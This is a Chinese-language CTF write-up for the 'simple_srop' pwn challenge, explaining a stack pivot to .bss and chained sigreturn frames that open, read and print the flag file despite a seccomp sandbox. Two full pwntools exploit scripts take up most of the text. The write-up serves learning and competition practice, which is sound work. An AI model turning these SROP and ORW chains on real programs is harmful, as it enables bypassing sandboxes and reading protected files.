
### simple_srop


这是一道沙箱加上srop的题目，可以看到下面的黑名单没有禁用orw

只有一个栈溢出

![[Pasted image 20240923212059.png]]

发现了sigreturn，也就是打srop

![[Pasted image 20240923212109.png]]
![[Pasted image 20240916095618.png]]
\

![[Pasted image 20240916122921.png]]


![[Pasted image 20240923212213.png]]

可以看到可用的寄存器是很少的
![[Pasted image 20240923212138.png]]
下面是内存映像

![[Pasted image 20240923212227.png]]

大致思路：因为没有输出函数，我们没办法去泄露栈的地址，我们现在只能去迁移到bss段了，然后在bss段上去构造orw，flag,去打印结果。

详细思路：如果是迁移到bss段的话，我们需要将第一次的read的rbp段填上bss段的位置，且位置的地址要以0x100的倍数，然后ret的地址填上read函数的地址，这样函数就可以再次回到read了，再次输入的时候我们就可以将flag和用sigreturnframe构造的read函数填入bss段处，这次构造的read函数的作用是将orw写入bss段。

下面是对代码的详细讲解：

这个的read函数的rsi之所以要设置成bss+0x200是因为在迁移的时候buf=bss-0x20了，然后read的时候buf=bss-0x20+0x200=bss-0x1e0,然后你这次想填入的orw的初始地址不能和第一次read的地址东西重叠了，所以我们从bss-0x200开始，就行了，下面的rsp用意是执行下一次函数的地址，我们的orw的输入的函数的地址就是从bss-0x200开始的，也就是说open的函数的地址就是bss-0x200,所以rsp=bss-0x200，rip是固定的填上syscall。

```
#read(0, bss+0x200,0x600)
#自己构造一个read函数并写入0x500字节
pay = b'flag'.ljust(0x20, b'\x00') + flat(bss, sig_ret)
#这里的bss段可以换成0xdeadbeef
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = bss + 0x200
frame.rdx = 0x500      #这里其实0x300就够了
frame.rsp = bss + 0x200  #这个是跳的open的位置执行
frame.rip = syscall
 
pay += bytes(frame)
p.send(pay.ljust(0x200, b'\x00'))
```

这个就是构造的open函数，open(bss-0x20,0,0),之所以从rdi=bss-0x20开始读取是因为flag读入的地方是buf=bss-0x20，这里调试可以看到

rsp之所以是加上0x100是因为，SigreturnFrame()的大小是248个字节，每个SigreturnFrame()前面都加上了p64(sig_ret),正好是8个字节，加起来就是248+8=256（0x100）字节。

```
frame = SigreturnFrame()
frame.rax = 2
frame.rdi = bss - 0x20 #之所以从bss-0x20开始读取是因为flag读入的地方是buf=bss-0x20，这里调试可以看到
frame.rsi = 0
frame.rdx = 0
frame.rsp = bss + 0x200 + 0x100  #这个是跳到read的位置执行
frame.rip = syscall
pay += flat(frame)
```

#read(3,bss-0x100,0x50)

#意思是向bss-0x100的地方写入0x50个字节

可以把写入的bss段的地址写入到远一点的地址，防止和输入的orw重合，但是别超出0x402000范围.

```
#read(3,bss-0x100,0x50)
#意思是向bss-0x100的地方写入0x50个字节
pay += p64(sig_ret)
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 3
frame.rsi = bss+0x700
frame.rdx = 0x50
frame.rsp = bss + 0x200 + 0x100*2  #这个是跳到write的位置执行
frame.rip = syscall
pay += flat(frame)
```

#write

#write(1,bss-0x100,0x50)

#意思是从bss-0x100的地方开始读取0x50个字节，打印出来

```
#write
#write(1,bss-0x100,0x50)
#意思是从bss-0x100的地方开始读取0x50个字节，打印出来
pay += p64(sig_ret)
frame = SigreturnFrame()
frame.rax = 1
frame.rdi = 1
frame.rsi = bss+0x700
frame.rdx = 0x50
frame.rsp = bss + 0x200 + 0x100*3  #这里的rsp是多少就无所谓了
frame.rip = syscall
pay += flat(frame)
```

##### wp

我自己更倾向于第一种写法，第二种用的是sendfile的调用，我自己看的很不习惯

```
from pwn import *
context(arch='amd64', log_level='debug')
#libc = ELF('./libc.so.6') #2.31-0ubuntu9.14
elf = ELF('./vuln')
p = process('./vuln')
 
sig_ret = 0x401296
syscall = 0x40129d
bss = 0x404800
 
#move stack to bss
p.send(flat(b'\x00'*0x20, bss, 0x4012b9).ljust(0x200, b'\x00'))
 
#read(0, bss+0x200,0x600)
#自己构造一个read函数并写入0x500字节
pay = b'flag'.ljust(0x20, b'\x00') + flat(bss, sig_ret)
#这里的bss段可以换成0xdeadbeef
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = bss + 0x200
frame.rdx = 0x500      #这里其实0x300就够了
frame.rsp = bss + 0x200  #这个是跳的open的位置执行
frame.rip = syscall
 
pay += bytes(frame)
p.send(pay.ljust(0x200, b'\x00'))
 
pay = p64(sig_ret)
#.....................
#SigreturnFrame()的大小是248个字节
#我不是太明白为什么rsp是以0x100（256）的字节增长，我用248字节打不通

#我现在知道为什么248不行了，因为每个SigreturnFrame()前面都加上了p64(sig_ret),
#正好是8个字节，加起来就是248+8=256（0x100）字节。
#.....................

#open
#open(bss-0x20,0,0)
#打开bss-0x20的位置的文件
frame = SigreturnFrame()
frame.rax = 2
frame.rdi = bss - 0x20 #之所以从bss-0x20开始读取是因为flag读入的地方是buf=bss-0x20，这里调试可以看到
frame.rsi = 0
frame.rdx = 0
frame.rsp = bss + 0x200 + 0x100  #这个是跳到read的位置执行
frame.rip = syscall
pay += flat(frame)
 
#read
#read(3,bss-0x100,0x50)
#意思是向bss-0x100的地方写入0x50个字节
pay += p64(sig_ret)
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 3
frame.rsi = bss-0x100
frame.rdx = 0x50
frame.rsp = bss + 0x200 + 0x100*2  #这个是跳到write的位置执行
frame.rip = syscall
pay += flat(frame)
 
#write
#write(1,bss-0x100,0x50)
#意思是从bss-0x100的地方开始读取0x50个字节，打印出来
pay += p64(sig_ret)
frame = SigreturnFrame()
frame.rax = 1
frame.rdi = 1
frame.rsi = bss-0x100
frame.rdx = 0x50
frame.rsp = bss + 0x200 + 0x100*3  #这里的rsp是多少就无所谓了
frame.rip = syscall
pay += flat(frame)
 
p.send(pay)
p.interactive()
```

```
from pwn import *
context.arch='amd64'
#io=remote('192.168.52.1',61251)
io=process('./vuln')
bss=0x404400
back=0x4012B9
sig=0x401296
ret=0x000000000040101a
syscall=0x40129D
ret=0x000000000040101a

payload=cyclic(0x20)+p64(bss)+p64(ret)+p64(back)
io.sendline(payload)
#open+sendfile+read

before=SigreturnFrame()
before.rdi=0
before.rax=0
before.rsi=bss+0x200
before.rdx=0x600
before.rip=syscall
before.rsp=bss+0x200

payload=b'flag'.ljust(0x28,b'\x00')+p64(sig)+bytes(before)
io.sendline(payload)

exeve=SigreturnFrame()
syscall=0x40129D
exeve.rdi=bss-0x20
exeve.rax=2
exeve.rsi=0
exeve.rip=syscall
exeve.rsp=bss+0x200+0x200

exeve1=SigreturnFrame()
exeve1.rax=0x28
exeve1.rdi=1
exeve1.rsi=3
exeve1.rdx=0
exeve1.r10=0x300
exeve1.rip=syscall
payload=p64(sig)+bytes(exeve).ljust(0x1f8,b'\x00')+p64(sig)+bytes(exeve1)
io.sendline(payload)
io.interactive()
```